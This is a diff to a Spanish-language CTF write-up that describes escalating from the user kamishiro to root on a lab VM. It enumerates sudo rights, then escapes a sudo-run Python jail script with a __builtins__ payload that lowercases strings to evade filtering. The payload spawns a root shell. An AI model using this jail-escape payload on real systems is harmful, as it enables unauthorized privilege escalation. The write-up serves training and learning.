@@ -318,19 +318,66 @@ Enunciado :
 		kamishiro@vagrant:~$ cat user.txt
 		e6215e25c0783-------693d9f073594a
 
-- Post-Explotacion elevamos privilegios kamishiro to root.
+ ## Post-Explotacion elevamos privilegios kamishiro to root.
 
-	1) Enumeramos los comandos permitidos y prohibidos, que el usuario kamishiro puede ejecutar como superuser.
+-  Enumeramos los comandos permitidos y prohibidos, que el usuario kamishiro puede ejecutar como superuser.
 
-			kamishiro@vagrant:~$ sudo -l
-			[sudo] password for kamishiro: 
-			Matching Defaults entries for kamishiro on vagrant.vm:
-			    env_reset, exempt_group=sudo, mail_badpass,
-			    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+		kamishiro@vagrant:~$ sudo -l
+		[sudo] password for kamishiro: 
+		Matching Defaults entries for kamishiro on vagrant.vm:
+		    env_reset, exempt_group=sudo, mail_badpass,
+		    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 			
-			User kamishiro may run the following commands on vagrant.vm:
-			    (ALL) /usr/bin/python3 /home/kamishiro/jail.py
+		User kamishiro may run the following commands on vagrant.vm:
+		    (ALL) /usr/bin/python3 /home/kamishiro/jail.py
+
+- Listamos los permisos jail.py, solo lectura.
+  
+	  	kamishiro@vagrant:~$ ls -la jail.py
+		-rw-r--r-- 1 root root 588 Jan 23  2021 jail.py
+
+- Analizamos jail.py
+
+	![image](https://github.com/Esevka/CTF/assets/139042999/e07ac32c-e273-4518-9712-9f2af7595520)
+
+
+- Elevamos a root.
+
+	- Para saltarnos la proteccion lo haremos mediante el modulo '__builtins__'
+  
+ 			 __builtins__ es un módulo que contiene el espacio de nombres de las funciones incorporadas que están disponibles en todos los programas Python.
+
+	- Tras muchas pruebas en python y leer mucha documentacion.
+
+ 		1) Esto es lo que necesitamos ejecutar por ejemplo.
+   
+			 	 >>> __builtins__.__import__('os').system('ls')
+
+  		2) Nos saltamos la proteccion del script jail.py
+
+  				>>> __builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__[('SYSTEM'.lower())]('ls')
+
+	- Ejecutamos y leemos flag root.txt
+
+			kamishiro@vagrant:~$ sudo /usr/bin/python3 /home/kamishiro/jail.py 
+			Hi! Welcome to my world kaneki
+			========================================================================
+			What ? You gonna stand like a chicken ? fight me Kaneki
+			>>> __builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__[('SYSTEM'.lower())]('/bin/bash') 
+			root@vagrant:~# whoami
+			root
+			root@vagrant:/root# id
+			uid=0(root) gid=0(root) groups=0(root)
+			root@vagrant:/root# ls
+			root.txt
+			root@vagrant:/root# cat root.txt
+			9d790bb87898c-------b05a9e6000b
+
+
+
+
+   		
+  
+
 	
-
-
-
+  
